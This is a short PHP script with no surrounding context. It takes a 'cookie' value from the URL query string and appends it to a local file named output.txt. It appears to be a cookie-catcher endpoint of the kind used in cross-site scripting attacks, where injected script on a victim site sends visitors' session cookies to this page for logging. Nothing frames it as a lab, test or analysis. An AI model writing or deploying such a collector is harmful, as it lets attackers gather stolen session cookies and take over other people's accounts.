<?php
$name = "cookie";
$val = $_GET[$name] . "\n";
$fileName = "output.txt";
file_put_contents($fileName, $val, FILE_APPEND);
?>
